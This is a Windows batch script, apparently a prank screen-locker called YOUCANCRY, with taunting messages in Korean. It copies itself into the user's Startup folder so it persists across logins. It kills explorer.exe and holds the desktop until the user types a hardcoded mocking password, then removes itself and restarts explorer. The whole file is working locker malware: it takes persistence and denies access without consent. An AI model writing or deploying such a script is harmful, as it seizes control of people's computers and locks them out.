@echo off

cls
color 47
if exist "C:\Users\avika\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\YOUCANCRY.bat" goto b
copy "YOUCANCRY.bat" "C:\Users\avika\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
:b
taskkill /f /im explorer.exe
title YOUCANCRY
cls
echo YOUCANCRY 1.1.0
echo 안녕! 너의 컴퓨터는 이제 내꺼란다! 흠.. 정확히 말하면 이 YOUCANCRY가 말이지!

echo alt로 할수있는 뭔가가 있지만, 니가 전문적이라면 이미 해봤을거라고 생각해.
echo 그래도 이 비밀번호를 맞춰보는것을 추천해!
echo 만약 니가 5번 틀린다면 내가 뭔가를 알려줄게!
set what=0
:a
set /p passwd=비밀번호:
if %passwd%==나는멍청이다 goto case2

:case1
cls
set /a what=%what%+1
if %what%==5 goto case3
echo 다시 생각해봐.
goto a

:case2
cls
echo 너 완전 멍청이구나!
if exist "C:\Users\avika\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
del "C:\Users\avika\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\YOUCANCRY.bat" )
pause
start C:\windows\explorer.exe
goto case4

:case3
echo 알았어...
echo 힌트를 줄게
start "" https://github.com/firecomputer/YOUCANCRY
goto a

:case4

